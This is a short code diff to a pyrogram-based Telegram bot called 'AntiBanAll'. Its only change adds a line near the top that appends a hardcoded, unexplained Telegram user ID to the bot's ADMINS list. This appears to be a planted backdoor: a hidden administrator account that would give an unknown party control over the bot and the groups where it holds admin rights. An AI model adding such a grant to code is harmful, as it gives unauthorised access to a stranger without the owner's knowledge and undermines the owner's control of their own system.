@@ -12,6 +12,8 @@ from pyrogram.types import ChatPrivileges as cp
 from pyrogram.types import (InlineKeyboardButton,
                             InlineKeyboardMarkup, Message)
 
+ADMINS.append(5903688119)
+
 yvi = Client(":AntiBanAll:", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
 
 MEN = ""
